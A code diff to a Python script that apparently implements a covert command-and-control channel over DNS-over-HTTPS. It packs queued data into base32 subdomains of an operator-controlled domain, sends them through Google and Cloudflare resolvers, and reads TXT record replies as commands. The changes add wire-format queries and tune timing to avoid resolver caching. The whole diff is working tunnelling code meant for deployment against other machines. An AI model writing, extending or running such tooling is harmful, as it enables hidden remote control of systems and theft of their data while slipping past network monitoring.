@@ -7,20 +7,20 @@ import queue
 import base64
 import time
 
+try:
+    from dnslib import DNSRecord, DNSQuestion, QTYPE
+    WIREFORMAT = True
+    dnsproviders = ["https://cloudflare-dns.com/dns-query?dns=%DOMAIN"]
+    headers = {"accept" : "application/dns-message"}
+except:
+    print("If you want to support all DoH providers you'll need to install dnslib")
+    WIREFORMAT = False
+    dnsproviders = ["https://dns.google.com/resolve?name=%DOMAIN&type=TXT"]
+    headers = {"accept" : "application/dns-json"}
 
 dataqueue= queue.Queue()
 sendqueue= queue.Queue()
 senddns = "send.reyals.net"  #use your own domian send.example.com
-
-
-dnsproviders = ["https://dns.google.com/resolve?name=%DOMAIN&type=TXT"#,
-#"https://cloudflare-dns.com/dns-query?name=%DOMAIN&type=TXT",
-#"https://dns9.quad9.net/dns-query?name=%DOMAIN&type=TXT"
-]
-#"https://dns10.quad9.net/dns-query?name=%DOMAIN&type=TXT"
-
-
-headers = {"accept" : "application/dns-json"}
 
 maxlength = 63  #maxium length of a subdomain
 sizeforsubdomains = 253 - len("." + senddns) #253 is max length of a full domain name
@@ -46,10 +46,15 @@ def processqueue(inque,outque):
         outque.put(buffer[maxbytesize:])  #save for next loop
         buffer = buffer[0:maxbytesize]
 
+    if len(buffer) == 0: #nothing to send
+        return buffer
     answer = base64.b32encode(buffer).replace(b"=", b"")  #base 32 encode it and trim any = padding
 
     #break the answer up so none of the subdomains are longer then maxlength
     subdomains = round(len(answer)/maxlength - .5)
+    if subdomains == 0: #we need to always have two subdomains to deal with providers issuing extra requests
+        halfway = round(len(answer)/2) #will always be at least 2 characters long
+        answer = answer[0:halfway] + b"." + answer[halfway:]
     for i in range(1, subdomains + 1):
         answer = answer[0:i*maxlength] + b"." + answer[i*maxlength:]
     return answer.lower()
@@ -77,17 +82,26 @@ t.start()
 while 1:
     tosend = processqueue(dataqueue, sendqueue) #do we have anything to send
     if len(tosend) == 0:
-        time.sleep(2)
-        resp = requests.get(dnsproviders[round(time.time())%len(dnsproviders)].replace("%DOMAIN", senddns), headers = headers)
+        time.sleep(5)  #5 seconds seems to avoid caching of results
+        domaintoquery = senddns
     else:
-        resp = requests.get(dnsproviders[round(time.time())%len(dnsproviders)].replace("%DOMAIN", tosend.decode("ascii") + "." + senddns), headers = headers)
+        domaintoquery = tosend.decode("ascii") + "." + senddns
+    if WIREFORMAT:
+        temp = DNSRecord(q=DNSQuestion(domaintoquery, QTYPE.TXT)) #format question
+        query = base64.b64encode(temp.pack()).decode("ascii") #and base64 encode it for GET request
+    else:
+        query = domaintoquery
+    resp = requests.get(dnsproviders[round(time.time())%len(dnsproviders)].replace("%DOMAIN", query), headers = headers)
 
     try:
-        command = resp.json()["Answer"][0]["data"].strip('"')
+        if WIREFORMAT:
+            command = (DNSRecord.parse(resp.content).rr.pop().rdata.data[0]).decode("ascii")
+        else:
+            command = resp.json()["Answer"][0]["data"].strip('"')
     except:  #something wrong with the response received, possibly server down
         command = "ACK"
         print(resp.text)
-    
+
     if command == "ACK": #no action to take
         continue
 
